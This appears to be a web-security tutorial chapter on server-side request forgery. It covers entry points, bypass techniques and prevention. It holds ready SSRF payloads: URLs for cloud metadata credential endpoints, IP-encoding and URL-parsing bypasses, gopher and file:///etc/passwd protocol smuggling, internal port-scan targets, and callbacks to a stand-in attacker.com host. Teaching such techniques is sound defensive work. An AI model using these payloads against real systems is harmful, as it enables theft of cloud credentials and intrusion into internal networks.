# Server-Side Request Forgery (SSRF)

SSRF occurs when an attacker can make the server send HTTP requests to arbitrary destinations, often bypassing firewalls and accessing internal systems.

## Types of SSRF

### Basic SSRF (Response is returned)
Server fetches a URL and returns the content.
```http
POST /fetch-page HTTP/1.1
url=http://169.254.169.254/latest/meta-data/     # AWS metadata
url=http://metadata.google.internal/              # GCP metadata
url=http://localhost:8080/admin                    # Internal admin panel
```

### Blind SSRF (No direct response)
Server makes a request but doesn't return the response. Use external callbacks.
```http
POST /webhook HTTP/1.1
url=http://attacker.com/collect                   # Out-of-band detection
```

## Common SSRF Entry Points

- URL/URI parameters (`url=`, `path=`, `dest=`, `redirect=`, `link=`)
- File download/import functionality
- Webhook configuration
- Image processing from URL
- PDF generation (wkhtmltopdf, PhantomJS)
- Document conversion/parsing (XML import, XSLT)
- Proxy-like functionality

## Bypass Techniques

### DNS Rebinding
```bash
# Use a DNS rebinding service
url=http://7f000001.7f000001.rbndr.us:8080/admin   # 127.0.0.1
url=http://n0148160.nip.io:8080/admin               # nip.io wildcard
```

### URL Parsing Confusion
```
http://expected.com@127.0.0.1/admin                 # Credentials bypass
http://127.0.0.1#@expected.com/admin                 # Fragment bypass
http://expected.com:80@127.0.0.1:443/admin           # Port confusion
http://127.0.0.1\x00@expected.com/admin              # Null byte
```

### Redirect Bypass
```
http://attacker.com/redirect?to=http://169.254.169.254/
```

### Alternative Representations
```
http://0x7f000001/                                   # Hex IP
http://2130706433/                                   # Integer IP
http://0177.0.0.1/                                   # Octal IP
http://127.1/                                        # Short IP
http://[::1]/                                        # IPv6 localhost
```

### Protocol Smuggling
```
file:///etc/passwd
gopher://localhost:6379/_*1%0d%0a$8%0d%0a...
dict://localhost:11211/
```

## Cloud Metadata Endpoints

| Provider | Metadata URL |
|----------|--------------|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
| DigitalOcean | `http://169.254.169.254/metadata/v1.json` |
| Alibaba | `http://100.100.100.200/latest/meta-data/` |

### AWS Metadata Endpoints
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/public-keys/
```

## Detection Tools

- **ffuf**: Fuzz parameters with SSRF-friendly payloads
- **Interactsh**: Blind SSRF callback detection
- **Burp Collaborator**: Integrated SSRF detection
- **Project Discovery**: `ssrf-tool`, Nuclei SSRF templates

```bash
# Detect SSRF parameters
cat urls.txt | grep -E "(url|path|dest|redirect|uri|file|load|read|domain|callback|return|page|feed|host|port|to|out|view|dir|show|location)" | sort -u

# Test with interactsh
interactsh-client
# Use generated URL as parameter value and watch for callbacks
```

## Exploitation: Port Scanning via SSRF

```
http://localhost:22
http://localhost:3306
http://localhost:6379
http://127.0.0.1:9200       # Elasticsearch
http://172.16.0.1:22
http://10.0.0.1:443
```

## Prevention

1. **Allow-list** — Only permit URLs from approved domains
2. **Deny private IPs** — Block 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
3. **Validate URL scheme** — Reject `file://`, `gopher://`, `dict://`
4. **No redirect following** — Or validate the final URL
5. **Isolate the service** — Run URL fetcher in a restricted network segment

---

> **Next**: [Insecure Direct Object References (IDOR)](06-idor.md)
